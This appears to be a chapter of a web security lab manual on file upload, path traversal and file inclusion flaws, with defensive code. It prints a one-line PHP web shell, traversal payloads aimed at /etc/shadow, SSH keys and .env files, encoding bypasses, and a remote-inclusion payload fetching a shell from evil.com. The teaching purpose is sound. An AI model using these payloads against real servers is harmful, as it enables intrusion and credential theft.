# 📁 Lab Manual: File Operation Vulnerabilities

### 0. Preface
The file system is the server's "innards," and file operation vulnerabilities let attackers "reach inside." Uploading malicious files, reading sensitive configs, traversing directory structures—each one is deadly.

*   **File Operation Vulnerabilities**: Security flaws in file upload, download, read, and include operations.
*   **Core Concept**: The server trusts user-provided filenames or paths.

This chapter's goal: **Understand why a single `../` can read `/etc/passwd`.**

---

### 1. File Upload Vulnerabilities

**Why It's Dangerous**:
Upload a WebShell, gain complete server control.

**Classic Attack**:
```php
// evil.php
<?php system($_GET['cmd']); ?>

// After upload, access
http://target.com/uploads/evil.php?cmd=whoami
```

**Bypass Techniques**:
```
1. Double extension: shell.php.jpg
2. Case variation: shell.PhP
3. Special suffixes: shell.php5, shell.phtml
4. Null byte: shell.php%00.jpg (old versions)
5. Content-Type spoofing
6. Image shell: embed code in image
```

---

### 2. Path Traversal (Directory Traversal)

**The Concept**:
Using `../` sequences to escape the intended directory and access arbitrary files.

**Attack Examples**:
```
# Normal request
GET /download?file=report.pdf

# Path traversal attack
GET /download?file=../../../etc/passwd
GET /download?file=....//....//....//etc/passwd
GET /download?file=..%2f..%2f..%2fetc/passwd
```

**Common Target Files**:
```
Linux: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa
Windows: C:\Windows\win.ini, C:\boot.ini
App configs: ../application.yml, ../.env
```

---

### 3. File Inclusion Vulnerabilities

**Local File Inclusion (LFI)**:
```php
<?php include($_GET['page']); ?>

// Attack
?page=../../../etc/passwd
?page=/var/log/apache2/access.log  // Combined with log poisoning
```

**Remote File Inclusion (RFI)**:
```php
// Requires allow_url_include=On
?page=http://evil.com/shell.txt
```

**LFI to RCE Techniques**:
```
1. Log file inclusion (Log Poisoning)
2. Session file inclusion
3. /proc/self/environ
4. PHP wrappers: php://input, php://filter
```

---

### 4. Bypass Techniques Collection

**Encoding Bypass**:
```
../  →  %2e%2e%2f
../  →  %2e%2e/
../  →  ..%252f (double encoding)
../  →  ....// (filter replacement bypass)
```

**Null Byte Truncation** (old versions):
```
shell.php%00.jpg
```

**Path Normalization Differences**:
```
Windows: ..\..\..\..\
Mixed: ..\../..\..\
Unicode: %c0%ae%c0%ae/
```

---

### 5. Defense Measures

**File Upload Defense**:
```python
import os
import uuid

ALLOWED_EXTENSIONS = {'png', 'jpg', 'gif', 'pdf'}

def secure_upload(file):
    # 1. Check extension (whitelist)
    ext = file.filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise SecurityError("File type not allowed")
    
    # 2. Generate random filename
    new_filename = f"{uuid.uuid4()}.{ext}"
    
    # 3. Validate file content (magic bytes)
    # 4. Store in non-web-accessible directory
    # 5. Use CDN or dedicated file service
```

**Path Traversal Defense**:
```python
import os

def safe_path(base_dir, user_input):
    # Normalize path
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    
    # Ensure still within base directory
    if not full_path.startswith(os.path.abspath(base_dir)):
        raise SecurityError("Path traversal detected")
    
    return full_path
```

**File Inclusion Defense**:
```php
// Use whitelist
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include($page . '.php');
}
```

---

### 6. Conclusion

File operation vulnerabilities directly threaten server filesystem security. A successful file upload can lead to server compromise; a path traversal can leak all configurations and source code.

Remember: **Never trust user-provided filenames and paths. Always use whitelists and path normalization.**

---

**[Ready? Go explore the server's "folders"]**
